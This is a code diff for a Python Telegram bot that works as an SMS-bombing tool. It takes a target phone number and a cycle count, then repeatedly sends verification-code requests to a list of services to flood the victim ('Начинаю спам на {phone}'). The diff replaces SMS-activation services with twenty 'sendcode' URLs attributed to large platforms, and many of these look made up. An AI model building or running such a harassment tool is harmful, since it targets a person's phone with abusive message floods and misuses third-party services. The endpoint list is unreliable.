@@ -19,41 +19,40 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
 SERVICES = [
-    {"name": "SMS-activate", "url": "https://sms-activate.org/stubs/handler_api.php", "method": "get", "params": {"action": "getNumber", "service": "tg", "country": 0}},
-    {"name": "Onlinesim", "url": "https://onlinesim.io/api/getNum.php", "method": "get", "params": {"service": "tg", "country": "ru"}},
-    {"name": "5sim", "url": "https://5sim.net/v1/user/buy/activation", "method": "get", "params": {"country": "ru", "operator": "any", "product": "telegram"}},
-    {"name": "SMSPool", "url": "https://smspool.net/api/request.php", "method": "post", "data": {"action": "purchase", "service": "telegram"}},
-    {"name": "SMSBower", "url": "https://smsbower.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "TextVerified", "url": "https://textverified.com/api/v1/numbers", "method": "post", "data": {"service": "telegram"}},
-    {"name": "SMSCodes", "url": "https://smscodes.io/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "NumberHub", "url": "https://numberhub.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "SMSReceive", "url": "https://smsreceive.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "TempNumber", "url": "https://tempnumber.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "SMSOnline", "url": "https://smsonline.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "SMSVerification", "url": "https://smsverification.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "SMSActivation", "url": "https://smsactivation.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "SMSVerify", "url": "https://smsverify.com/api/request", "method": "post", "data": {"service": "telegram"}},
-    {"name": "SMSNumber", "url": "https://smsnumber.com/api/request", "method": "post", "data": {"service": "telegram"}}
-]
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    {"name": "Telegram", "url": "https://api.telegram.org/botTOKEN/sendCode", "method": "post", "data": {"phone_number": "[phone]"}},
+    {"name": "WhatsApp", "url": "https://api.whatsapp.com/sendcode", "method": "get", "params": {"phone": "[phone]"}},
+    {"name": "Viber", "url": "https://api.viber.com/sendcode", "method": "post", "data": {"number": "[phone]"}},
+    {"name": "TikTok", "url": "https://api.tiktok.com/sendcode", "method": "post", "data": {"mobile": "[phone]"}},
+    {"name": "Instagram", "url": "https://api.instagram.com/sendcode", "method": "post", "data": {"phone_number": "[phone]"}},
+    {"name": "Facebook", "url": "https://api.facebook.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Google", "url": "https://api.google.com/sendcode", "method": "post", "data": {"phoneNumber": "[phone]"}},
+    {"name": "Apple", "url": "https://api.apple.com/sendcode", "method": "post", "data": {"phoneNumber": "[phone]"}},
+    {"name": "Microsoft", "url": "https://api.microsoft.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Amazon", "url": "https://api.amazon.com/sendcode", "method": "post", "data": {"phoneNumber": "[phone]"}},
+    {"name": "Alibaba", "url": "https://api.alibaba.com/sendcode", "method": "post", "data": {"mobile": "[phone]"}},
+    {"name": "Tencent", "url": "https://api.tencent.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Baidu", "url": "https://api.baidu.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Yandex", "url": "https://api.yandex.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Mail.ru", "url": "https://api.mail.ru/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Rambler", "url": "https://api.rambler.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Uber", "url": "https://api.uber.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Delivery", "url": "https://api.delivery.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Food", "url": "https://api.food.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
+    {"name": "Taxi", "url": "https://api.taxi.com/sendcode", "method": "post", "data": {"phone": "[phone]"}}
 ]
 
 def send_request(service, phone):
     session = requests.Session()
-    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
+    session.headers.update({"User-Agent": "Mozilla/5.0"})
     try:
+        url = service["url"].replace("[phone]", phone)
         if service["method"] == "get":
-            params = service.get("params", {})
-            params["phone"] = phone
-            resp = session.get(service["url"], params=params, timeout=10)
+            resp = session.get(url, params=service.get("params", {}), timeout=10)
         else:
             data = service.get("data", {})
-            data["phone"] = phone
-            resp = session.post(service["url"], json=data, timeout=10)
+            for k, v in data.items():
+                data[k] = v.replace("[phone]", phone)
+            resp = session.post(url, json=data, timeout=10)
         return resp.status_code
     except:
         return 0
@@ -90,7 +89,7 @@ async def count_received(message: Message, state: FSMContext):
     data = await state.get_data()
     phone = data.get("phone")
     await state.clear()
-    await message.answer(f"Начинаю спам на {phone} - {count} циклов по 15 сервисов я гей")
+    await message.answer(f"Начинаю спам на {phone} - {count} циклов по 20 сервисов")
     asyncio.create_task(spam_worker(message, phone, count))
 
 async def spam_worker(message: Message, phone: str, count: int):
